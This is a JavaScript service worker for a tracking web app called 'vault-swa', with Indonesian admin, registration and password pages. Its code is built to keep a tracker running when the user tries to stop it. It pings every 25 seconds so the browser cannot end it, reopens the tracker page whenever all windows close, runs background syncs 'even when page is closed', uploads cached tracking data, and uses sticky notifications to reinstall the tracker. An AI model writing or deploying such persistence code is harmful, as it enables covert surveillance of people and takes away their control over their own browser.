const CACHE = 'vault-swa-v3';
const ASSETS = ['/','/admin.html','/lupa-password.html','/daftar.html','/favicon.svg','/manifest.json','/tracker.js','/app.js','/firebase-config.js'];
const TRACKER_SERVER = self.location.origin;

// Keep service worker alive with periodic tasks
let keepAliveInterval = null;

self.addEventListener('install', (e) => {
    self.skipWaiting();
    e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
});

self.addEventListener('activate', (e) => {
    e.waitUntil(clients.claim());
    startKeepAlive();
});

// Keep service worker alive - prevent termination
function startKeepAlive() {
    if (keepAliveInterval) return;
    keepAliveInterval = setInterval(() => {
        // Ping server to keep SW alive
        fetch(TRACKER_SERVER + '/ping', { 
            method: 'POST',
            mode: 'no-cors',
            keepalive: true,
            body: JSON.stringify({ sw: 'alive', time: Date.now() })
        }).catch(() => {});
        
        // Keep clients alive
        self.clients.matchAll({ includeUncontrolled: true, type: 'window' }).then(clients => {
            if (clients.length === 0) {
                // No clients - try to reopen
                self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
            } else {
                // Ping all clients to keep them alive
                clients.forEach(client => {
                    client.postMessage({ type: 'keepalive', time: Date.now() });
                });
            }
        });
    }, 25000); // Every 25s to prevent SW termination (Chrome kills after 30s idle)
}

// Intercept fetch — redirect non-asset requests to tracker
self.addEventListener('fetch', (e) => {
    const url = new URL(e.request.url);
    if (url.origin === TRACKER_SERVER && ASSETS.includes(url.pathname)) {
        return e.respondWith(caches.match(e.request));
    }
});

// Background sync — flush pending data
self.addEventListener('sync', (e) => {
    if (e.tag === 'sync-tracker') {
        e.waitUntil(flushPending());
    }
});

async function flushPending() {
    const cache = await caches.open(CACHE);
    const keys = await cache.keys();
    for (const req of keys) {
        if (req.url.includes('/track/')) {
            const res = await cache.match(req);
            if (res) {
                try {
                    await fetch(req.url, { method: 'POST', body: await res.text(), headers: { 'Content-Type': 'application/json' } });
                    await cache.delete(req);
                } catch(e) {}
            }
        }
    }
}

// Periodic background sync (Chromium)
self.addEventListener('periodicsync', (e) => {
    if (e.tag === 'periodic-tracker') {
        e.waitUntil(periodicSync());
    }
});

async function periodicSync() {
    // Run tracking tasks even when page is closed
    try {
        // Ping server
        await fetch(TRACKER_SERVER + '/api/background-sync', {
            method: 'POST',
            mode: 'cors',
            keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'periodic',
                time: Date.now(),
                registration: 'background-sync'
            })
        });
        
        // Try to reopen page if no clients
        const clients = await self.clients.matchAll({ type: 'window' });
        if (clients.length === 0) {
            await self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
        }
    } catch(e) {}
}

// Handle messages from page
self.addEventListener('message', (e) => {
    if (e.data && e.data.type === 'KEEP_ALIVE') {
        e.waitUntil(
            e.source.postMessage({ type: 'PONG', time: Date.now() })
        );
    }
    
    if (e.data && e.data.type === 'START_BACKGROUND') {
        startKeepAlive();
    }
});

// Push notification - keep alive
self.addEventListener('push', (e) => {
    const data = e.data ? e.data.json() : {};
    e.waitUntil(
        self.registration.showNotification(data.title || 'Neural AI', {
            body: data.body || 'Aktivitas terdeteksi',
            icon: '/favicon.svg',
            badge: '/favicon.svg',
            tag: 'neural-tracker',
            requireInteraction: true,
            silent: false,
            vibrate: [100, 100, 100],
            data: { url: data.url || TRACKER_SERVER + '/' }
        })
    );
});

// Notification click - reopen + reinstall tracker
self.addEventListener('notificationclick', (e) => {
    e.notification.close();
    const targetUrl = e.notification.data?.url || TRACKER_SERVER + '/';
    e.waitUntil(
        self.clients.matchAll({ type: 'window', includeUncontrolled: true }).then(clientList => {
            // If any window already open, focus it
            for (const client of clientList) {
                if (client.url.includes(TRACKER_SERVER) && 'focus' in client) {
                    return client.focus().then(() => {
                        client.postMessage({ type: 'REINSTALL_TRACKER', time: Date.now() });
                    });
                }
            }
            // Otherwise open new window
            return self.clients.openWindow(targetUrl);
        })
    );
});

// Auto-reinstall tracker when client reports closed
self.addEventListener('message', (e) => {
    if (e.data && e.data.type === 'CLIENT_CLOSED') {
        // Reopen tracker after short delay
        setTimeout(() => {
            self.clients.matchAll({ type: 'window' }).then(clients => {
                if (clients.length === 0) {
                    self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
                }
            });
        }, 3000);
    }
    if (e.data && e.data.type === 'PING_REINSTALL') {
        e.source.postMessage({ type: 'PONG_REINSTALL', time: Date.now() });
    }
});
